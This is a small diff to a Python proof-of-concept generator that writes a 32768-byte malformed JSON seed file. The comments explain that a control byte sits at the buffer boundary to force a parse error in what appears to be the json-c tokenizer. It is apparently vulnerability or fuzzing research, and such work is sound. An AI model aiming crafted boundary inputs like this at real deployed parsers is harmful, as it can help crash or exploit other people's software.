@@ -7,11 +7,14 @@ def generate_poc():
     # THE KEY: The JSON must be INVALID (no closing quote/brace) and exactly fill the buffer.
     # Buffer is 32768. 
     # Prefix = '{"key":"' (8 chars).
+    # To avoid "json_tokener_continue" (which exits cleanly), we need a PARSE ERROR.
+    # We place an invalid control char (e.g. \x01) at the very end (byte 32768).
     prefix = '{"key":"'
-    # Fill exactly to 32768 bytes
-    padding = "A" * (32768 - len(prefix)) 
-    # The payload is just the open string. It will fail to parse at the end.
-    payload = prefix + padding
+    # Fill up to 32767 bytes
+    padding = "A" * (32768 - len(prefix) - 1)
+    # Last byte is invalid char to force error at boundary
+    suffix = "\x01" 
+    payload = prefix + padding + suffix
     with open("manual_seed.json", "w") as f:
         f.write(payload)
     print(f"    Created manual_seed.json ({len(payload)} bytes - INVALID JSON)")
